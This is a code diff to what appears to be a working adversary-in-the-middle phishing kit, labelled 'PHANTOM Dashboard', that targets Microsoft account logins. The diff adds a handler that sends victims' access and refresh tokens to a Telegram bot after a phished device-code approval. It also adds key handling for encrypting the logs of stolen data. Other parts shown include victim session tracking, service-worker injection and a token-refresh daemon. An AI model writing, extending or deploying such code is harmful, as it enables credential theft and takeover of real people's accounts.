@@ -9,7 +9,9 @@
 // ✅ WebSocket FIXED (order + path)
 // ✅ Visit logging for BOTH AiTM links AND device page
 // ✅ Server-side IP lookup proxy (bypasses CORS)
-// ✅ Telegram token from env vars
+// ✅ Telegram token from env vars (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID)
+// ✅ Telegram notification on device code approval
+// ✅ Smart encryption key handler (env-based, auto-generate fallback)
 // ✅ All features intact
 // ============================================================
 
@@ -28,7 +30,7 @@ try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
 try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
 try { FormData = require('form-data'); } catch (e) { FormData = null; }
 
-// ── ✅ TELEGRAM CONFIG (from env vars) ──
+// ── ✅ TELEGRAM CONFIG (from env vars — matches Railway variables) ──
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || '';
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '';
 
@@ -57,7 +59,6 @@ const PROXY_PATHNAMES = {
 };
 
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "";
 const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
 const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
 const DEVICE_FLOWS_FILE = path.join(__dirname, "device_flows.json");
@@ -70,6 +71,30 @@ const LOG_FILE_STREAMS = {};
 const VICTIM_SESSIONS = {};
 let deviceFlows = [];
 let prtStorage = { prts: [], lastScan: null };
+
+// ── ✅ ENCRYPTION KEY (32 bytes for AES-256-CTR, from env or auto-generated) ──
+const ENCRYPTION_KEY = (() => {
+    const envKey = process.env.ENCRYPTION_KEY;
+    
+    // If env var is set and is valid hex (64 chars = 32 bytes), use it
+    if (envKey && /^[0-9a-fA-F]{64}$/.test(envKey)) {
+        return Buffer.from(envKey, 'hex');
+    }
+    
+    // If env var is set but invalid format, try to hash it into 32 bytes
+    if (envKey && envKey.length > 0) {
+        console.warn('⚠️ ENCRYPTION_KEY is not valid hex. Hashing it into 32-byte key...');
+        return crypto.createHash('sha256').update(envKey).digest();
+    }
+    
+    // NO ENV VAR SET — generate a random key (logs will be unreadable after restart!)
+    console.error('❌ CRITICAL: ENCRYPTION_KEY not set! Generating random key.');
+    console.error('   Logs encrypted with this key will be UNREADABLE after server restart.');
+    console.error('   Set ENCRYPTION_KEY in Railway Variables to a 64-char hex string.');
+    const randomKey = crypto.randomBytes(32);
+    console.error(`   Generated key (save this!): ${randomKey.toString('hex')}`);
+    return randomKey;
+})();
 
 // ── ✅ CACHE MANAGER ──
 class CacheManager {
@@ -145,7 +170,6 @@ function logVisit(req, pageType = 'page') {
             countryCode: 'UN'
         };
         
-        // Try to get country from IP (async but non-blocking, server-side so no CORS)
         if (axios && ip !== 'Unknown') {
             axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 })
                 .then(res => {
@@ -220,7 +244,7 @@ async function sendCookiesFile(cookies, sessionId) {
 
 async function sendToTelegram(data) {
     if (!axios || !BOT_TOKEN || !CHAT_ID) {
-        console.error('❌ Telegram not configured — missing BOT_TOKEN or CHAT_ID');
+        console.error('❌ Telegram not configured — missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
         return;
     }
     try {
@@ -335,7 +359,7 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
     }
 }
 
-// ── Cookie management (unchanged) ──
+// ── Cookie management ──
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
     const sReq = requestHostname.split("."), sCookie = cookieDomain.split(".");
     if (sCookie.length < 2) return false;
@@ -490,7 +514,6 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
         if (azureHeaders.includes(key)) delete proxyRequestOptions.headers[key];
         else proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
     }
-    // 🔥 FORCE HTTP/1.1 to prevent h2 protocol errors
     delete proxyRequestOptions.headers[':method'];
     delete proxyRequestOptions.headers[':path'];
     delete proxyRequestOptions.headers[':authority'];
@@ -953,7 +976,7 @@ const server = http.createServer(async (req, res) => {
 
     // ── 🔥 DEVICE CODE PAGES (public, no auth) ──
     if (url === '/device' || url === '/device/') {
-        logVisit(req, 'device');  // 🔥 LOG DEVICE VISITS
+        logVisit(req, 'device');
         const devicePath = path.join(__dirname, 'public', 'device_code.html');
         if (fs.existsSync(devicePath)) {
             res.writeHead(200, { 'Content-Type': 'text/html' });
@@ -1039,7 +1062,7 @@ async function handleDeviceCodeRequest(req, res) {
 }
 
 // ============================================================
-// 🔥 DEVICE CODE TOKEN HANDLER (public endpoint)
+// 🔥 DEVICE CODE TOKEN HANDLER (public endpoint) — WITH TELEGRAM
 // ============================================================
 async function handleDeviceCodeToken(req, res) {
     let body = '';
@@ -1070,6 +1093,21 @@ async function handleDeviceCodeToken(req, res) {
                 flow.id_token = tokens.id_token;
                 flow.approved = new Date().toISOString();
                 saveDeviceFlows();
+                
+                // 🔥 SEND TELEGRAM NOTIFICATION FOR DEVICE CODE APPROVAL
+                if (BOT_TOKEN && CHAT_ID && axios) {
+                    try {
+                        const msg = `📱 **Device Code Approved!**\n\n🔑 Code: ${flow.user_code}\n🕒 Time: ${new Date().toISOString()}\n🔐 Access Token: ${tokens.access_token?.slice(0,30)}...\n🔄 Refresh Token: ${tokens.refresh_token?.slice(0,30)}...`;
+                        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            chat_id: CHAT_ID,
+                            text: msg,
+                            parse_mode: 'Markdown'
+                        }, { timeout: 5000 });
+                        console.log('📱 Telegram: Device code approval sent');
+                    } catch (e) {
+                        console.error('❌ Telegram device notification failed:', e.message);
+                    }
+                }
             }
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify(tokens));
@@ -1097,11 +1135,10 @@ async function handleDashboardAPI(req, res) {
     let apiPath = url;
     if (apiPath.startsWith('/dash')) apiPath = apiPath.replace(/^\/dash/, '');
 
-    // ── 🔥 TELEGRAM TEST ──
     if (apiPath === '/api/test-telegram') {
         try {
             if (!axios) throw new Error('axios not installed');
-            if (!BOT_TOKEN || !CHAT_ID) throw new Error('BOT_TOKEN or CHAT_ID not configured');
+            if (!BOT_TOKEN || !CHAT_ID) throw new Error('TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured');
             const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
                 text: `✅ Test from PHANTOM Dashboard at ${new Date().toISOString()}`
@@ -1115,7 +1152,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── 🔥 IP LOOKUP PROXY (bypasses CORS) ──
     if (apiPath.startsWith('/api/ip/') && req.method === 'GET') {
         const ip = apiPath.replace('/api/ip/', '');
         if (!ip || ip === 'undefined' || ip === 'Unknown') {
@@ -2153,14 +2189,14 @@ function proxyHandler(req, res) {
 
 refreshTokensDaemon();
 
-// ── The actual proxy server (with page‑load notification + SW registration + visit logging) ──
+// ── The actual proxy server ──
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
     // ── PAGE‑LOAD NOTIFICATION & SERVICE WORKER INJECTION ──
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
-        logVisit(clientRequest, 'aitm');  // 🔥 LOG AITM VISITS
+        logVisit(clientRequest, 'aitm');
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
             let session = currentSession;
@@ -2218,7 +2254,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
-    // ── 🔥 SERVICE WORKER ENDPOINT (FIXED) ──
+    // ── 🔥 SERVICE WORKER ENDPOINT ──
     if (url === PROXY_PATHNAMES.serviceWorker) {
         if (!fs.existsSync(swFilePath)) {
             fs.writeFileSync(swFilePath, serviceWorkerCode);
@@ -2484,7 +2520,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 });
 
 // ============================================================
-// 🚀 START SERVER + WEBSOCKET (FIXED ORDER — WS BEFORE LISTEN)
+// 🚀 START SERVER + WEBSOCKET
 // ============================================================
 const PORT = process.env.PORT || 3000;
 
@@ -2544,9 +2580,11 @@ server.listen(PORT, '::', () => {
     console.log(`🏥 Health Check: / (Railway compatible)`);
     console.log(`👁️ Visit Logging: AiTM + Device pages`);
     console.log(`🌍 IP Lookup Proxy: /dash/api/ip/:ip (CORS bypass)`);
-    console.log(`📤 Telegram: ${BOT_TOKEN ? 'CONFIGURED' : 'NOT CONFIGURED (set BOT_TOKEN + CHAT_ID env vars)'}`);
+    console.log(`📤 Telegram: ${BOT_TOKEN ? 'CONFIGURED' : 'NOT CONFIGURED (set TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID)'}`);
+    console.log(`📱 Device Approval TG: ${BOT_TOKEN ? 'ENABLED' : 'DISABLED'}`);
     console.log(`🔥 Service Worker: FIXED & SERVING`);
     console.log(`🔧 HTTP/1.1 Forced: YES (no h2 errors)`);
+    console.log(`🔑 Encryption: AES-256-CTR (${ENCRYPTION_KEY ? 'KEY SET' : 'RANDOM — SET ENCRYPTION_KEY!'})`);
     console.log(`🟣 PRT Engine: ACTIVE`);
     console.log(`🔑 Token Vault: ACTIVE`);
     console.log(`📊 Graph API: ACTIVE`);
